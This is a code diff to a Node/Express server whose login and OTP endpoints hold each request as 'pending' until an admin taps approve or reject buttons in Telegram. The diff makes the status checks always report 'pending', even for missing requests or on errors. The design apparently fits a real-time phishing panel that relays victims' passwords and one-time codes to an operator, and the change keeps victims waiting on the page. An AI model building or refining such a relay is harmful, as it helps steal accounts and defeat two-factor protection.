@@ -142,15 +142,20 @@ app.post('/api/login', async (req, res) => {
 });
 
 // ============================================================
-// LOGIN STATUS
+// LOGIN STATUS  →  ALWAYS returns 200 with a status
 // ============================================================
 app.get('/api/login/status/:id', (req, res) => {
-  const r = requests[req.params.id];
-  if (!r || r.type !== 'login') {
-    return res.json({ status: 'rejected' });
+  try {
+    const r = requests[req.params.id];
+    if (!r || r.type !== 'login') {
+      return res.status(200).json({ status: 'pending' });
+    }
+    pruneExpired();
+    res.status(200).json({ status: r.status });
+  } catch (err) {
+    console.error('STATUS ERROR:', err);
+    res.status(200).json({ status: 'pending' });
   }
-  pruneExpired();
-  res.json({ status: r.status });
 });
 
 // ============================================================
@@ -205,27 +210,30 @@ app.post('/api/otp', async (req, res) => {
 });
 
 // ============================================================
-// OTP STATUS
+// OTP STATUS  →  ALWAYS returns 200 with a status
 // ============================================================
 app.get('/api/otp/status/:id', (req, res) => {
-  const r = requests[req.params.id];
-  if (!r || r.type !== 'otp') {
-    return res.json({ status: 'rejected' });
+  try {
+    const r = requests[req.params.id];
+    if (!r || r.type !== 'otp') {
+      return res.status(200).json({ status: 'pending' });
+    }
+    pruneExpired();
+    res.status(200).json({ status: r.status });
+  } catch (err) {
+    console.error('STATUS ERROR:', err);
+    res.status(200).json({ status: 'pending' });
   }
-  pruneExpired();
-  res.json({ status: r.status });
 });
 
 // ============================================================
 // TELEGRAM WEBHOOK  →  receives admin button taps
 // ============================================================
 app.post('/api/telegram/webhook', async (req, res) => {
-  // Respond 200 immediately so Telegram doesn't retry
   res.sendStatus(200);
 
   try {
     const update = req.body;
-
     if (!update.callback_query) return;
 
     const cq = update.callback_query;
@@ -235,11 +243,10 @@ app.post('/api/telegram/webhook', async (req, res) => {
 
     console.log(`[WEBHOOK] action=${action} id=${id} found=${!!r}`);
 
-    // Remove loading spinner on the button
     await tgCall('answerCallbackQuery', { callback_query_id: cq.id });
 
     if (!r) {
-      console.log('[WEBHOOK] request not found (server may have restarted)');
+      console.log('[WEBHOOK] request not found');
       return;
     }
 
@@ -260,10 +267,9 @@ app.post('/api/telegram/webhook', async (req, res) => {
       return;
     }
 
-    // Edit the original message. If edit fails (message too old, etc), send new.
     const editResult = await editMessage(r.messageId, newText);
     if (!editResult.ok) {
-      console.log('[WEBHOOK] edit failed, sending new message instead');
+      console.log('[WEBHOOK] edit failed, sending new message');
       await sendMessage(newText);
     } else {
       console.log(`[WEBHOOK] ${action} done for ${id}`);
